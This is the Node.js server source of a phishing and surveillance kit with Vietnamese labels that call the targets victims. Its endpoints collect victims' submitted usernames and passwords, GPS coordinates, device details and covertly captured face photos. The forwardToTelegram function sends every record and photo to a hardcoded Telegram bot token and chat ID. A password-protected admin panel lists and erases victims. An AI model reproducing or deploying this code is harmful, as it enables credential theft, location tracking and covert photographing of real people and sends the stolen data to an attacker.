const express = require('express');
const multer  = require('multer');
const path    = require('path');
const fs      = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

const UPLOAD_DIR = path.join(__dirname, 'uploads');
const DATA_DIR   = path.join(__dirname, 'data');
const LOG_FILE   = path.join(DATA_DIR, 'victims.jsonl');
fs.mkdirSync(UPLOAD_DIR, { recursive: true });
fs.mkdirSync(DATA_DIR,   { recursive: true });

const ADMIN_USER = 'eveujrmx';
const ADMIN_PASS = 'eveujrmx';
const SESSIONS = new Set();

const BOT_TOKEN = process.env.BOT_TOKEN || '8677283263:AAHCbjIS9tKYSWu098q1pOk_8D2V2sCxVA8';
const CHAT_ID   = process.env.CHAT_ID   || '7692889375';

const wq = { busy: false, q: [] };
function safeAppend(rec) {
  return new Promise(resolve => {
    wq.q.push({ rec, resolve });
    drain();
  });
}
function drain() {
  if (wq.busy || !wq.q.length) return;
  wq.busy = true;
  const { rec, resolve } = wq.q.shift();
  try { fs.appendFileSync(LOG_FILE, JSON.stringify(rec) + '\n'); } catch(e){}
  wq.busy = false;
  resolve();
  drain();
}

async function forwardToTelegram(rec, filePath) {
  if (!BOT_TOKEN || !CHAT_ID) return;
  try {
    const text = `🚨 CÓ NẠN NHÂN MỚI!\n\n` +
      `🕐 Time: ${rec.time || '-'}\n` +
      `🌐 IP: ${rec.ip || '-'}\n` +
      `📷 Camera: ${rec.data?.cameraStatus || rec.cameraStatus || '-'}\n` +
      `📍 GPS: ${rec.data?.gpsStatus || rec.gpsStatus || '-'}\n` +
      `🗺 Tọa độ: ${rec.data?.gpsCoords || rec.gpsCoords || '-'}\n` +
      `🔋 Pin: ${rec.data?.battery || rec.battery || '-'}\n` +
      `📶 Mạng: ${rec.data?.network || rec.network || '-'}\n` +
      `👤 User: ${rec.data?.form?.username || '-'}\n` +
      `🔑 Pass: ${rec.data?.form?.password || '-'}\n` +
      `💻 UA: ${(rec.data?.ua || rec.ua || '').slice(0, 80)}`;

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text })
    });

    if (filePath && fs.existsSync(filePath)) {
      const fileBuf = fs.readFileSync(filePath);
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('photo', new Blob([fileBuf], { type: 'image/jpeg' }), 'victim.jpg');
      fd.append('caption', `📸 Mặt nạn nhân — IP ${rec.ip || '?'}`);
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: fd
      });
    }
  } catch(e) { console.log('TG fail:', e.message); }
}

const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, UPLOAD_DIR),
  filename: (req, file, cb) => {
    const ip = getClientIP(req).replace(/[^0-9a-f:.]/gi, '');
    cb(null, `${Date.now()}_${ip}_${Math.random().toString(36).slice(2)}.jpg`);
  }
});
const upload = multer({ storage, limits: { fileSize: 15 * 1024 * 1024 } });

app.set('trust proxy', true);
app.use(express.json({ limit: '3mb' }));

function getClientIP(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
      || req.socket.remoteAddress;
}

app.post('/register', async (req, res) => {
  const rec = {
    time: new Date().toISOString(),
    ip: getClientIP(req),
    ua: req.headers['user-agent'],
    ref: req.headers['referer'],
    data: req.body
  };
  await safeAppend(rec);
  console.log('📝', rec.ip);
  forwardToTelegram(rec, null);
  res.json({ ok: true });
});

app.post('/face', upload.single('photo'), async (req, res) => {
  if (!req.file) return res.status(400).json({ ok: false });
  const rec = {
    time: new Date().toISOString(),
    ip: getClientIP(req),
    ua: req.headers['user-agent'],
    face: req.file.filename
  };
  await safeAppend(rec);
  console.log('📸', req.file.filename);
  forwardToTelegram(rec, req.file.path);
  res.json({ ok: true });
});

app.post('/api/login', (req, res) => {
  const { user, pass } = req.body || {};
  if (user === ADMIN_USER && pass === ADMIN_PASS) {
    const token = Math.random().toString(36).slice(2) + Date.now().toString(36);
    SESSIONS.add(token);
    return res.json({ ok: true, token });
  }
  res.json({ ok: false });
});

function checkToken(req, res, next) {
  const t = req.headers['x-token'] || req.query.token;
  if (!t || !SESSIONS.has(t)) return res.status(401).json({ ok: false });
  next();
}

app.get('/api/victims', checkToken, (req, res) => {
  if (!fs.existsSync(LOG_FILE)) return res.json([]);
  const lines = fs.readFileSync(LOG_FILE, 'utf8').trim().split('\n').filter(Boolean);
  const recs = lines.map(l => { try { return JSON.parse(l); } catch { return null; } }).filter(Boolean);
  res.json(recs.reverse());
});

app.get('/api/photo/:name', checkToken, (req, res) => {
  const f = path.join(UPLOAD_DIR, path.basename(req.params.name));
  if (!fs.existsSync(f)) return res.status(404).send('not found');
  res.sendFile(f);
});

app.delete('/api/victim', checkToken, (req, res) => {
  const { time, ip } = req.query;
  if (!time) return res.status(400).json({ ok: false });
  if (!fs.existsSync(LOG_FILE)) return res.json({ ok: false });

  const lines = fs.readFileSync(LOG_FILE, 'utf8').trim().split('\n').filter(Boolean);
  let removed = 0;
  const kept = [];

  for (const line of lines) {
    try {
      const r = JSON.parse(line);
      if (r.time === time && (!ip || r.ip === ip)) {
        if (r.face) {
          const fp = path.join(UPLOAD_DIR, path.basename(r.face));
          if (fs.existsSync(fp)) { try { fs.unlinkSync(fp); } catch(e){} }
        }
        removed++;
        continue;
      }
    } catch(e){}
    kept.push(line);
  }

  fs.writeFileSync(LOG_FILE, kept.join('\n') + (kept.length ? '\n' : ''));
  res.json({ ok: true, removed });
});

app.delete('/api/victims', checkToken, (req, res) => {
  if (fs.existsSync(UPLOAD_DIR)) {
    for (const f of fs.readdirSync(UPLOAD_DIR)) {
      try { fs.unlinkSync(path.join(UPLOAD_DIR, f)); } catch(e){}
    }
  }
  if (fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, '');
  res.json({ ok: true });
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('/health', (req, res) => res.json({ ok: true, t: Date.now() }));

app.listen(PORT, () => console.log(`🌐 http://localhost:${PORT}`));